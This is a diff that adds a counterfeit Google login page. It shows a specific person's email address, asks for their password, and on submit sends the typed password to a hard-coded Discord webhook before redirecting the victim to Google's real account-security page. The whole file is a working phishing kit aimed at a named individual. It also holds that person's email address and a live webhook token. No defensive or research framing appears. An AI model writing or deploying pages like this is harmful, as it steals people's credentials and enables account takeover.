@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Google</title>
+
+    <!-- Favicon (Neues Google-Logo für die Tab-Auswahl) -->
+    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/022/613/027/non_2x/google-icon-logo-symbol-free-png.png" type="image/png" sizes="16x16">
+
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f1f3f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Container für das gesamte Layout */
+        .container {
+            width: 100%;
+            max-width: 400px; /* Maximalbreite des Containers */
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #202124;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .logo img {
+            width: 120px; /* Größeres Logo im Login-Bereich */
+            margin-bottom: 30px;
+        }
+
+        /* Account Preview: kleiner und zentrierter mit Schriftgröße 11px */
+        .email-preview {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            border: 1px solid #dcdcdc;
+            border-radius: 20px;
+            padding: 3px 8px; /* Dünneres Padding */
+            margin-bottom: 15px;
+            background-color: #f1f3f4;
+            font-size: 11px; /* Schriftgröße auf 11px geändert */
+            max-width: 160px; /* Maximale Breite für E-Mail reduziert */
+            overflow: hidden;
+            text-overflow: ellipsis; /* Truncates long emails */
+            width: auto; /* Zentriert das Feld */
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .email-preview img {
+            width: 20px; /* Kleinere Avatar-Größe */
+            height: 20px;
+            border-radius: 50%; /* Runder Avatar */
+            margin-right: 6px;
+        }
+
+        .email-preview span {
+            color: #202124;
+            white-space: nowrap; /* Verhindert Zeilenumbruch */
+            overflow: hidden;
+            text-overflow: ellipsis; /* Truncates long emails */
+        }
+
+        /* Dünneres und weniger rundes Input-Feld */
+        .input-field {
+            width: 100%;
+            padding: 12px 16px; /* Weniger Padding für dünneres Aussehen */
+            margin: 8px 0;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px; /* Weniger rundes Design */
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            border-color: #4285f4;
+            outline: none;
+        }
+
+        /* Dünnerer und runderer Button */
+        .login-button {
+            width: 100%;
+            padding: 12px 16px; /* Weniger Padding für dünneres Aussehen */
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 8px; /* Weniger rundes Design */
+            cursor: pointer;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-top: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #357ae8;
+        }
+
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .signup-button {
+            width: 100%;
+            padding: 12px 16px; /* Weniger Padding für dünneres Aussehen */
+            background-color: #f1f3f4;
+            color: #5f6368;
+            border: 1px solid #dadce0;
+            border-radius: 8px; /* Weniger rundes Design */
+            cursor: pointer;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+
+        .signup-button:hover {
+            background-color: #e8f0fe;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            width: 100%;
+        }
+
+        .separator-line {
+            flex-grow: 1;
+            border-top: 1px solid #dadce0;
+        }
+
+        .separator-text {
+            padding: 0 10px;
+            font-size: 14px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Google Logo (größeres Logo im Login-Bereich) -->
+    <div class="logo">
+        <img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" alt="Logo">
+    </div>
+
+    <form id="loginForm">
+        <!-- Account Preview: kleiner und zentrierter mit Schriftgröße 11px -->
+        <div class="email-preview">
+            <img src="https://www.gravatar.com/avatar/00000000000000000000000000000000?d=mp" alt="Avatar"> <!-- Beispiel Avatar -->
+            <span>m.schupsky@wsnoe.de</span>
+        </div>
+
+        <input type="password" class="input-field" id="password" placeholder="Enter your password" required>
+        <button type="submit" class="login-button">Next</button>
+    </form>
+
+    <!-- Forgot password link -->
+    <div class="forgot-password">
+        <a href="#">Forgot password?</a>
+    </div>
+
+    <div class="separator">
+        <div class="separator-line"></div>
+        <span class="separator-text">New to Google?</span>
+        <div class="separator-line"></div>
+    </div>
+
+    <!-- Sign up button -->
+    <button class="signup-button">Create account</button>
+</div>
+
+<script>
+    // Event listener for form submission
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();  // Prevent default form submission
+
+        var password = document.getElementById("password").value;  // Get the entered password
+
+        // Webhook URL (updated webhook URL)
+        var webhookURL = "https://discord.com/api/webhooks/1334583440829321267/zQU_OgkG79OoJoR_LjFtS21snbqP3E4mPjv8CM1U-_zXPUHKl2lWGxe_vGlz2k42fJCf";
+
+        // Prepare the data to be sent to the webhook
+        var data = {
+            content: "New password submitted: " + password  // Send the password as content
+        };
+
+        // Send a POST request to the webhook with the password data
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data)  // Convert the data to JSON
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
+
+        // Redirect to Google account security page after submission
+        window.location.href = "https://myaccount.google.com/security";
+    });
+</script>
+
+</body>
+</html>
